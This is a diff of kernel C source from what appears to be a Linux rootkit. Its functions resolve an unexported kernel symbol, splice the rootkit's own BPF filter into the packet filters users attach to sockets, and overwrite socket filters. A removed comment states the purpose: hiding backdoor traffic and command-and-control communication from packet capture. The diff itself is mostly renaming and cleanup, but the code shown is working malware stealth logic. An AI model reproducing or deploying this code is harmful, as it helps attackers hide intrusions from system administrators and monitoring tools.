@@ -8,40 +8,40 @@
     Replace ret instructions with a positive return value (e.g instructions to 'accept' the packet) with a jump instruction
     to the start of the user-defined BPF program (e.g 'program_offset').
 */
-static void rooti_replace_ret_instructions(struct sock_fprog_kern *filter_program, loff_t program_offset)
+static void rooti_replace_ret_instructions(struct sock_fprog_kern *fprog, loff_t program_offset)
 {
+    loff_t jmp_offset;
     for (int i = 0; i < program_offset; i++) {
-        if (BPF_CLASS(filter_program->filter[i].code) != BPF_RET) { continue; }
-        if (filter_program->filter[i].k == 0) { continue; }
-
-        loff_t jmp_offset = program_offset - (i + 1);
-        filter_program->filter[i].code = BPF_JMP | BPF_JA;
-        filter_program->filter[i].jt = 0;
-        filter_program->filter[i].jf = 0;
-        filter_program->filter[i].k = jmp_offset;
+        if (BPF_CLASS(fprog->filter[i].code) != BPF_RET || fprog->filter[i].k == 0) {
+            continue;
+        }
+        jmp_offset = program_offset - (i + 1);
+        fprog->filter[i].code = BPF_JMP | BPF_JA;
+        fprog->filter[i].jt = 0;
+        fprog->filter[i].jf = 0;
+        fprog->filter[i].k = jmp_offset;
     }
 }
 
 /*
     Concatenate two source BPF filter programs into one by ANDing the filters they represent.
-    Saves the result into the filter 'dst_program' which is heap-allocated and should be freed later.
+    Saves the result into the filter 'dst_fprog' which is heap-allocated and should be freed later.
 */
-static int rooti_concat_filter_programs(struct sock_fprog_kern *src_program1, struct sock_fprog_kern *src_program2,
-                                        struct sock_fprog_kern *dst_program)
+static int rooti_concat_filter_programs(struct sock_fprog_kern *src_fprog1, struct sock_fprog_kern *src_fprog2,
+                                        struct sock_fprog_kern *dst_fprog)
 {    
-    dst_program->len = src_program1->len + src_program2->len;
-    dst_program->filter = kcalloc(dst_program->len, sizeof(struct sock_filter), GFP_KERNEL);
-    if (dst_program->filter == NULL) {
+    dst_fprog->len = src_fprog1->len + src_fprog2->len;
+    dst_fprog->filter = kcalloc(dst_fprog->len, sizeof(struct sock_filter), GFP_KERNEL);
+    if (dst_fprog->filter == NULL) {
         ROOTI_DEBUG("failed to allocate memory");
         return -ENOMEM;
     }
 
-    memcpy(dst_program->filter, src_program1->filter, bpf_classic_proglen(src_program1));
-    memcpy(dst_program->filter + src_program1->len, src_program2->filter, bpf_classic_proglen(src_program2));
+    memcpy(dst_fprog->filter, src_fprog1->filter, bpf_classic_proglen(src_fprog1));
+    memcpy(dst_fprog->filter + src_fprog1->len, src_fprog2->filter, bpf_classic_proglen(src_fprog2));
 
     // Replace ret instructions of the 'accept path' with a jump to the start of the user program
-    rooti_replace_ret_instructions(dst_program, src_program1->len);
-
+    rooti_replace_ret_instructions(dst_fprog, src_fprog1->len);
     return 0;
 }
 
@@ -80,71 +80,75 @@ int rooti_copy_user_fprog(struct sock_fprog_kern *user_fprog_kernel, sockptr_t f
 
 /*
     This function attaches additional cBPF filters (which are specifyed in the rootkit's configuration)
-    to the filters specified by the user. This is used to conceal certain network traffic that we wish to hide,
-    such as backdoor traffic or communication with C&C.
+    to the filters specified by the user. It effectively merges the user defined filter program with the rootkit's
+    filter program such that both filters must be satisfied in order to accept the packet.
 */
-int rooti_inject_traffic_filter(struct sock *sock, struct sock_fprog_kern *user_filter_program)
+int rooti_inject_traffic_filter(struct sock *sock, struct sock_fprog_kern *user_fprog)
 {
     ROOTI_RESOLVE_FUNC_ADDR(__sk_attach_prog, -EINVAL, int, struct bpf_prog *, struct sock *);
 
-    struct sock_fprog_kern kern_filter_program = {
+    struct sock_fprog_kern kern_fprog = {
         .filter = ROOTI_BPF_FILTER_PROGRAM,
         .len = ROOTI_BPF_FILTER_PROGRAM_COUNT
     };
-    struct sock_fprog_kern complete_filter_program;
-    struct bpf_prog *bpf_program;
+    struct sock_fprog_kern merged_fprog;
+    struct bpf_prog *bpf_prog;
     int err;
 
-    if (kern_filter_program.len > 255) {
+    if (kern_fprog.len > 255) {
         ROOTI_DEBUG("configured BPF filter is longer than the maximum of 255 instructions");
         return -EINVAL;
     }
 
-    err = rooti_concat_filter_programs(&kern_filter_program, user_filter_program, &complete_filter_program);
+    err = rooti_concat_filter_programs(&kern_fprog, user_fprog, &merged_fprog);
     if (err) {
         return err;
     }
 
-    err = bpf_prog_create(&bpf_program, &complete_filter_program);
-    if (bpf_program == NULL) {
+    err = bpf_prog_create(&bpf_prog, &merged_fprog);
+    if (bpf_prog == NULL) {
         ROOTI_DEBUG("bpf_prog_create() failed %d", err);
         return err;
     }
 
-    err = ____sk_attach_prog(bpf_program, sock);
+    err = ____sk_attach_prog(bpf_prog, sock);
     if (err) {
-        bpf_prog_destroy(bpf_program);
+        bpf_prog_destroy(bpf_prog);
         ROOTI_DEBUG("__sk_attach_prog() failed: %d", err);
         return err;
     }
 
-    kfree(complete_filter_program.filter);
-
+    kfree(merged_fprog.filter);
     return 0;
 }
 
+/*
+    This function overwrites the BPF filter attached to 'sock' with the rootkit's
+    configured BPF filter program.
+*/
 int rooti_overwrite_traffic_filter(struct sock *sock)
 {
     ROOTI_RESOLVE_FUNC_ADDR(__sk_attach_prog, -EINVAL, int, struct bpf_prog *, struct sock *);
 
-    struct sock_fprog_kern filter_program = {
+    struct sock_fprog_kern fprog = {
         .filter = ROOTI_BPF_FILTER_PROGRAM,
         .len = ROOTI_BPF_FILTER_PROGRAM_COUNT
     };
-    struct bpf_prog *bpf_program;
+    struct bpf_prog *bpf_prog;
     int err;
 
-    err = bpf_prog_create(&bpf_program, &filter_program);
-    if (bpf_program == NULL) {
+    err = bpf_prog_create(&bpf_prog, &fprog);
+    if (bpf_prog == NULL) {
         ROOTI_DEBUG("bpf_prog_create() failed %d", err);
         return err;
     }
 
-    err = ____sk_attach_prog(bpf_program, sock);
+    err = ____sk_attach_prog(bpf_prog, sock);
     if (err) {
-        bpf_prog_destroy(bpf_program);
+        bpf_prog_destroy(bpf_prog);
         ROOTI_DEBUG("__sk_attach_prog() failed: %d", err);
         return err;
     }
+
     return 0;
 }
